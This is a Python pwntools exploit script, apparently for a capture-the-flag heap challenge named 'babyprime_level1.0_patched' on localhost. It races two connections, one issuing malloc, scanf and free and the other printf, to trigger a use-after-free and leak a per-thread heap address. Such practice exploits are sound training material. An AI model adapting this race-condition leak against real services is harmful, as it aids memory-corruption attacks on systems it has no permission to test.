import time 
from pwn import *
import os

def leak_perthread_addr(r1, r2):
    if os.fork() == 0:
        for _ in range(1000):  # Reduced iterations for faster testing
            r1.sendline(b"malloc")
            r1.sendline(b"0")
            r1.sendline(b"scanf") 
            r1.sendline(b"0")
            r1.sendline(b"AAAAAAAAAAAAAAABBBBBBBBBBBBBBB")
            r1.sendline(b"free")
            r1.sendline(b"0")
        os.kill(os.getpid(), 9)
    
    for _ in range(1000):
        r2.sendline(b"printf")
        r2.sendline(b"0")
    
    os.wait()
    output = r2.clean()
    r1.clean()
    
    print("Raw output snippet:")
    print(repr(output))  # Just show first 500 bytes
    
    # Simple approach: look for MESSAGE lines with non-printable chars
    lines = output.split(b'\n')
    for line in lines:
        if b'MESSAGE:' in line and len(line) > 10:
            # Extract everything after "MESSAGE: "
            msg_content = line.split(b'MESSAGE: ', 1)[1]
            
            # Check if it has non-printable bytes (potential address)
            has_nonprint = any(b < 32 or b > 126 for b in msg_content)
            
            if has_nonprint and len(msg_content) >= 4:
                print(f"Found leak: {repr(msg_content)}")
                
                # Try to convert to address - just take the bytes as-is
                try:
                    leak_bytes = msg_content[:8].ljust(8, b'\x00')
                    leak = u64(leak_bytes)
                    print(f"Converted to: {hex(leak)}")
                    return leak
                except:
                    print("Failed to convert")
                    continue
    
    print("No leak found")
    return None

p = process('./babyprime_level1.0_patched')

r1 = remote("localhost", 1337)
r2 = remote("localhost", 1337)

perthread_leak = leak_perthread_addr(r1, r2)

if perthread_leak:
    print(f"Final leaked address: {hex(perthread_leak)}")
    pause()
    r1.close()
else:
    print("Failed to leak address")

p.kill()
